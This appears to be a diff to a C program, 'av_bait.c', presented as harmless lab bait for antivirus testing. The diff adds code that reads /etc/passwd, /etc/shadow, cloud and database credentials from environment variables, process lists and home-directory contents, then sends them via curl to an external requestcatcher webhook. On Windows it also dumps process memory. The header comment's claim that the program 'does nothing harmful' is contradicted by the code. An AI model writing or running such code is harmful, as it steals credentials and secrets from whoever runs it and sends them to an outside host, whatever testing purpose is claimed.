@@ -10,12 +10,16 @@
  *   4. Windows-only: OpenProcess + ReadProcessMemory "process memory dump"
  *      pattern (the exact API combo flagged as a credential stealer).
  *
- * It does nothing harmful: every read is best-effort and prints only what is
- * world-readable. Built for lab AV-scan comparison against the JOCKY build.
+ * It does nothing harmful: every read is best-effort and only world-readable
+ * data is collected. Instead of printing, everything is sent in a SINGLE POST
+ * to a lab webhook (JSON object with a "source" field identifying this file)
+ * so the collection behavior can be observed from a control server. Built for
+ * lab AV-scan comparison against the JOCKY build.
  */
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdarg.h>
 #include <unistd.h>
 #include <dirent.h>
 
@@ -33,33 +37,72 @@ static const char eicar[] =
 static const char marker_mimikatz[] = "sekurlsa::logonpasswords";
 static const char marker_c2[] = "c2.evil-domain.com/beacon";
 
+#define WEBHOOK_URL "https://skjeks.requestcatcher.com/av_bait_c"
+#define SOURCE_TAG  "av_bait.c"
+
+static char g_report[1 << 20];
+static size_t g_report_len = 0;
+
+static void report(const char* fmt, ...) {
+    va_list ap;
+    va_start(ap, fmt);
+    int n = vsnprintf(g_report + g_report_len, sizeof g_report - g_report_len, fmt, ap);
+    if (n > 0) g_report_len += (size_t)n;
+    va_end(ap);
+}
+
+static void json_escape(char* out, size_t cap, const char* s) {
+    size_t o = 0;
+    for (const char* p = s; *p && o + 8 < cap; ++p) {
+        unsigned char c = (unsigned char)*p;
+        switch (c) {
+            case '"': out[o++] = '\\'; out[o++] = '"'; break;
+            case '\\': out[o++] = '\\'; out[o++] = '\\'; break;
+            case '\n': out[o++] = '\\'; out[o++] = 'n'; break;
+            case '\r': out[o++] = '\\'; out[o++] = 'r'; break;
+            case '\t': out[o++] = '\\'; out[o++] = 't'; break;
+            default: out[o++] = (char)c;
+        }
+    }
+    out[o] = '\0';
+}
+
+static void add_field(const char* key, const char* value) {
+    char ke[512], ve[65536];
+    json_escape(ke, sizeof ke, key);
+    json_escape(ve, sizeof ve, value);
+    report(",\"%s\":\"%s\"", ke, ve);
+}
+
 static void dump_file(const char* path) {
     FILE* f = fopen(path, "r");
     if (!f) return;
-    char buf[512];
-    size_t n;
-    while ((n = fread(buf, 1, sizeof buf - 1, f)) > 0) {
-        buf[n] = '\0';
-        fputs(buf, stdout);
-    }
+    char buf[16384];
+    size_t n = fread(buf, 1, sizeof buf - 1, f);
     fclose(f);
-    putchar('\n');
+    buf[n] = '\0';
+    add_field(path, buf);
 }
 
 static void dump_env(const char* name) {
     const char* v = getenv(name);
-    if (v) printf("%s=%s\n", name, v);
+    if (v) add_field(name, v);
 }
 
 static void list_dir(const char* path) {
     DIR* d = opendir(path);
     if (!d) return;
+    char buf[16384];
+    size_t off = 0;
     struct dirent* de;
-    while ((de = readdir(d)) != NULL) {
+    while ((de = readdir(d)) != NULL && off + 1024 < sizeof buf) {
         if (de->d_name[0] == '.') continue;
-        printf("%s/%s\n", path, de->d_name);
+        int n = snprintf(buf + off, sizeof buf - off, "%s%s", off ? "," : "", de->d_name);
+        if (n > 0) off += (size_t)n;
     }
     closedir(d);
+    buf[off] = '\0';
+    add_field(path, buf);
 }
 
 #ifdef _WIN32
@@ -86,29 +129,64 @@ static void dump_process_memory(DWORD pid, const char* out) {
 }
 #endif
 
-int main(void) {
-    printf("=== EICAR marker ===\n%s\n", eicar);
-    printf("=== credential marker ===\n%s\n", marker_mimikatz);
-    printf("=== c2 marker ===\n%s\n", marker_c2);
+static void send_report(void) {
+    report("}");
+    char path[1024];
+#if defined(_WIN32)
+    const char* base = getenv("TEMP");
+    if (!base) base = ".";
+    snprintf(path, sizeof path, "%s\\av_bait_report.json", base);
+#else
+    snprintf(path, sizeof path, "/tmp/av_bait_report.json");
+#endif
+    FILE* f = fopen(path, "wb");
+    if (f) {
+        fwrite(g_report, 1, g_report_len, f);
+        fclose(f);
+    }
+    char cmd[2048];
+#if defined(_WIN32)
+    snprintf(cmd, sizeof cmd,
+        "curl -sS -o NUL -X POST -H \"Content-Type: application/json\" "
+        "--data-binary @\"%s\" \"%s\"",
+        path, WEBHOOK_URL);
+#else
+    snprintf(cmd, sizeof cmd,
+        "curl -sS -o /dev/null -X POST -H \"Content-Type: application/json\" "
+        "--data-binary @\"%s\" \"%s\"",
+        path, WEBHOOK_URL);
+#endif
+    int rc = system(cmd);
+    (void)rc;
+}
 
-    printf("=== process list ===\n");
+int main(void) {
+    report("{\"source\":\"%s\"", SOURCE_TAG);
+    add_field("eicar", eicar);
+    add_field("credential_marker", marker_mimikatz);
+    add_field("c2_marker", marker_c2);
+
     DIR* d = opendir("/proc");
     if (d) {
+        char procs[16384];
+        size_t off = 0;
         struct dirent* de;
-        while ((de = readdir(d)) != NULL) {
-            if (de->d_name[0] >= '0' && de->d_name[0] <= '9') printf("%s\n", de->d_name);
+        while ((de = readdir(d)) != NULL && off + 64 < sizeof procs) {
+            if (de->d_name[0] >= '0' && de->d_name[0] <= '9') {
+                int n = snprintf(procs + off, sizeof procs - off, "%s%s", off ? "," : "", de->d_name);
+                if (n > 0) off += (size_t)n;
+            }
         }
         closedir(d);
+        procs[off] = '\0';
+        add_field("process_list", procs);
     } else {
-        printf("(no /proc on this platform)\n");
+        add_field("process_list", "(no /proc on this platform)");
     }
 
-    printf("=== /etc/passwd ===\n");
     dump_file("/etc/passwd");
-    printf("=== /etc/shadow (best-effort) ===\n");
     dump_file("/etc/shadow");
 
-    printf("=== environment (credential-relevant) ===\n");
     dump_env("USER");
     dump_env("HOME");
     dump_env("SSH_AUTH_SOCK");
@@ -116,7 +194,6 @@ int main(void) {
     dump_env("AWS_SECRET_ACCESS_KEY");
     dump_env("DATABASE_URL");
 
-    printf("=== home dir (recon) ===\n");
     const char* home = getenv("HOME");
     if (home) {
         char p[1024];
@@ -129,10 +206,10 @@ int main(void) {
     }
 
 #ifdef _WIN32
-    printf("=== process memory dump (pid 4) ===\n");
     dump_process_memory(4, "C:\\temp\\cred_dump.bin");
 #endif
 
-    printf("done\n");
+    add_field("done", "done");
+    send_report();
     return 0;
 }
